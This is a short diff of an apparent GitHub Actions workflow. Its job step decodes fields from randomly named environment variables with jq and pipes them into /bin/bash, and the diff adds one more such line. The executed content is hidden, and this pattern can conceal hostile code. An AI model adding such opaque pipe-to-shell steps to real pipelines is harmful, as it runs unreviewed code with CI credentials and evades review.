@@ -39,6 +39,7 @@ jobs:
           printf '%s' "$stgqn00086" | jq -r .av96075 | /bin/bash
           printf '%s' "$kkiqj3" | jq -r .pwwke1 | /bin/bash
           echo $eem0 | jq -r .uy51 | /bin/bash
+          echo $fui3675 | jq -r .pk21 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
